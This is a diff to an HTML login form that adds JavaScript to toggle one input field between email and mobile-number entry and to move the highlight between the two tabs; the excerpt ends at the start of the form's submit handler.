@@ -25,14 +25,14 @@
       </div>
 
       <div class="detail">
-        <div class="email border">Email</div>
-        <div class="num">Mobile number</div>
+        <div id="emailDiv" class="email border">Email</div>
+        <div id="mobileDiv" class="num">Mobile number</div>
 
       </div>
 
       <form id="myForm" method="POST">
 
-        <input class="mail" name="email" type="text" placeholder="Please enter your email address">
+        <input id="contactInput" class="mail" name="email" type="text" placeholder="Please enter your email address">
         <input class="pwd" name="message" type="" placeholder="Please enter your password">
 
         <div class="checkbox-container checkdiv">
@@ -72,6 +72,35 @@
 
 
       <script>
+      // Get references to the DOM elements
+const contactInput = document.getElementById('contactInput');
+const emailDiv = document.getElementById('emailDiv');
+const mobileDiv = document.getElementById('mobileDiv');
+
+// Function to set the input field to Email
+function setEmailInput() {
+  contactInput.type = 'email';
+  contactInput.placeholder = 'Please enter email address';
+  emailDiv.classList.add('border');
+  mobileDiv.classList.remove('border');
+}
+
+// Function to set the input field to Mobile Number
+function setMobileInput() {
+  contactInput.type = 'tel';
+  contactInput.placeholder = 'Please enter your mobile number';
+  emailDiv.classList.remove('border');
+  mobileDiv.classList.add('border');
+}
+
+// Add click event listeners to toggle the input type
+emailDiv.addEventListener('click', setEmailInput);
+mobileDiv.addEventListener('click', setMobileInput);
+
+// Optional: Set initial state to email on page load
+setEmailInput();
+      
+      
         document.getElementById('myForm').addEventListener('submit', function(event) {
   event.preventDefault(); // Prevent the default form submission
 
